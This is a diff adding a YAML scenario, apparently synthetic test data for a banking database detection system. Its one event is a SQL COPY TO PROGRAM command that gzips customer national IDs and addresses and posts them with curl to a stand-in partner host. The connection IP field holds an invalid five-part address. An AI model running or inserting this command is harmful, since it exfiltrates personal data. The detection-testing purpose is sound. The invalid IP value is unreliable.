@@ -1,0 +1,30 @@
+scenario_id: gen_banking_52_copy_to_program_mal_1377m
+family_id: gen_banking_52_copy_to_program_fam_1377
+domain: banking
+time_of_day: 00:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT national_id, address FROM customers) TO PROGRAM 'gzip | curl
+      -sX POST https://sync.partner-mirror.example/ingest --data-binary @-'
+    connects_to:
+      ip: 193.42.33.144.218
+      port: 443
+matched_pair_id: gen_banking_52_copy_to_program_pair_1377
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
